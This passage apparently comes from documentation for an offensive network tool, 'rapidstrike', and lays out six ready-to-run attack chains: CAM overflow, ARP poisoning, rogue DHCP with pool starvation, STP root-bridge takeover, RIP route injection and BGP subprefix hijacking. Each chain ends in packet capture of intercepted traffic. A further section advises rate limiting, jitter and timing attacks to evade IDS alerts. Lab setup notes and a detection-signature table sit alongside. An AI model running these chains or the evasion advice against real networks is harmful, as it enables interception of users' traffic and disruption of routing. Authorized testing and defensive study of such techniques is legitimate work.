**Mitigation:** BGP TCP MD5 authentication on all eBGP/iBGP sessions;
RPKI with strict ROA enforcement; prefix-list inbound filtering;
maximum-prefix limits per peer.

---

## Attack Chains

### Chain 1: Passive Sniff (L2 unprotected segment)

```bash
# 1. Overflow CAM → switch becomes hub
sudo python3 rapidstrike.py cam -i eth0 --count 100000 \
    --engagement-id RoE-001 --operator johto --client TARGET

# 2. Passive capture on the now-hub segment
tcpdump -i eth0 -w /tmp/capture.pcap &

# 3. Let CAM recover and analyze traffic offline
```

### Chain 2: Full MITM (no DAI, no DHCP Snooping)

```bash
# Step 1: Pre-flight check
sudo python3 rapidstrike.py preflight -i eth0 --gateway 192.168.1.1

# Step 2: ARP poison victim ↔ gateway
sudo python3 rapidstrike.py arp -i eth0 -t 192.168.1.100 -g 192.168.1.1 \
    --jitter 2 --engagement-id RoE-001 --operator johto --client TARGET &

# Step 3: Capture (IP forwarding is auto-enabled by arp module)
tcpdump -i eth0 host 192.168.1.100 -w /tmp/victim_traffic.pcap
```

### Chain 3: DHCP MITM (take over client routing)

```bash
# Step 1: Exhaust legitimate DHCP pool
sudo python3 rapidstrike.py dhcp-starve -i eth0 --workers 16 &

# Step 2: Start rogue DHCP (wait ~60s for pool exhaustion)
sleep 60
sudo python3 rapidstrike.py dhcp \
    -i eth0 \
    --pool 192.168.1.150-192.168.1.200 \
    --gateway 192.168.1.50 \
    --dns 192.168.1.50 \
    --server-ip 192.168.1.50

# Step 3: Enable IP forwarding + capture
echo 1 > /proc/sys/net/ipv4/ip_forward
tcpdump -i eth0 -w /tmp/dhcp_mitm.pcap
```

### Chain 4: STP MITM (become root bridge)

```bash
# Step 1: Confirm STP is running (preflight)
sudo python3 rapidstrike.py preflight -i eth0

# Step 2: Take root bridge
sudo python3 rapidstrike.py stp -i eth0 --bridge-priority 0 --count 20

# Step 3: Enable forwarding (switch will route all traffic through us)
echo 1 > /proc/sys/net/ipv4/ip_forward
tcpdump -i eth0 -w /tmp/stp_mitm.pcap
```

### Chain 5: Route Hijacking (RIP legacy network)

```bash
# Step 1: Probe existing metrics
sudo python3 rapidstrike.py rip \
    -n 10.0.0.0 -s 192.168.1.50 -i eth0 \
    --probe --probe-timeout 40 --dry-run

# Step 2: Inject with auto-derived metric
sudo python3 rapidstrike.py rip \
    -n 10.0.0.0 -s 192.168.1.50 -i eth0 \
    --probe --count 0 --interval 30
```


### Chain 6: BGP Subprefix Hijack (enterprise internal BGP)

```bash
# Step 1: Verify BGP peer accepts unauthenticated session
sudo python3 rapidstrike.py bgp \
    --peer-ip 10.0.0.1 --peer-as 65001 \
    --local-as 65099 --router-id 10.0.0.99 \
    --prefix 192.168.10.0/24 --next-hop 10.0.0.99 \
    --dry-run   # inspect UPDATE without connecting

# Step 2: Inject subprefix and enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward
sudo python3 rapidstrike.py bgp \
    --peer-ip 10.0.0.1 --peer-as 65001 \
    --local-as 65099 --router-id 10.0.0.99 \
    --prefix 192.168.10.0/24 --next-hop 10.0.0.99 \
    --mode subprefix --duration 600

# Step 3: Capture redirected traffic
tcpdump -i eth0 net 192.168.10.0/25 -w /tmp/bgp_hijack.pcap
```

---

## Operational Security Notes

### Audit log

Every run appends to `rapidstrike_audit.log` (configurable with `--log`):

```
2024-11-15 14:32:01 | [eng=RoE-001 op=johto client=TARGET] INFO | ENGAGEMENT start ...
2024-11-15 14:32:01 | [eng=RoE-001 op=johto client=TARGET] INFO | START | technique=T1557.002 ...
2024-11-15 14:32:31 | [eng=RoE-001 op=johto client=TARGET] INFO | END | success=True
```

Attach this file to the assessment report as evidence of authorized testing.

### Minimize blast radius

- Always specify `--scope-note` describing the exact authorized segment.
- Use `--count` to limit the number of frames rather than running indefinitely.
- Use `--duration` flags where available to bound attack windows.
- The `arp` module always restores ARP tables on exit — confirm restoration
  before leaving the segment.

### Timing sensitivity

| Module | Notes |
|--------|-------|
| `arp` | Use `--jitter` in monitored environments. |
| `dhcp-starve` | Reduce `--workers` if DHCP server is rate-limiting by source port. |
| `ospf` | Extremely timing-sensitive. Do not use in production without lab validation. |
| `stp` | Topology reconvergence causes brief network disruption — warn client. |

---

## Lab Setup

### Recommended lab topology (GNS3 / EVE-NG)

```
[Attacker VM (Kali)]
        |
   eth0 (access port, VLAN 10)
        |
  [Cisco IOS Switch]──── [Target Router / PC]
        |
  [Management segment]
```

### Minimum GNS3 requirements

- Cisco IOS image: 12.4(T) or 15.x Catalyst emulation.
- EVE-NG community: free for up to 4 nodes.
- Kali Linux or Ubuntu 22.04 VM with `scapy>=2.5.0`.

### Testing checklist

Before field use, validate each module in the lab:

- [ ] `preflight` correctly identifies your lab's DAI/BPDUGuard config.
- [ ] `arp` MITM successfully intercepts HTTP traffic.
- [ ] `cam` causes Wireshark on another VM to see all segment traffic.
- [ ] `dhcp` hands out IPs visible in `ipconfig` / `dhclient -v`.
- [ ] `stp` causes root bridge election (verify with `sh span vlan 1` on switch).
- [ ] `rip` route appears in routing table (`sh ip route` on router).
- [ ] `ospf` requires exact IOS version match — test per target IOS.

---

## Known Detection Signatures

| Module | Common IDS/SIEM Detection |
|--------|--------------------------|
| `arp` | Periodic ARP gratuitous pairs; gratuitous ARP with MAC mismatch |
| `cam` | Port Security violation log; switch CPU spike; SNMP MAC-notification trap |
| `dhcp` / `dhcp-starve` | DHCP Snooping binding exhaustion; rapid lease acquisition from many MACs |
| `stp` | STP topology change notification; superior BPDU from unexpected port |
| `cdp` / `lldp` | Neighbor table growth spike in NMS |
| `ospf` | OSPF LSA origination from unexpected router ID |
| `rip` | RIP route with lower metric than known-good path |
| `bgp` | BGP UPDATE with unexpected NEXT_HOP or more-specific prefix; session from unauthorized peer IP |

### Reducing detection surface

1. **Rate limit:** Use `--rate` (cam) and `--interval` / `--jitter` (arp) to
   stay below threshold-based alerts.
2. **Time attacks:** Schedule during high-traffic periods when anomalous packets
   blend into baseline noise.
3. **Preflight first:** Avoid triggering Port Security or BPDU Guard by knowing
   what mitigations are active before sending any attack traffic.
4. **Scope tightly:** Use `--target-server` (dhcp-starve) and explicit IP targets
   to minimize out-of-scope traffic.
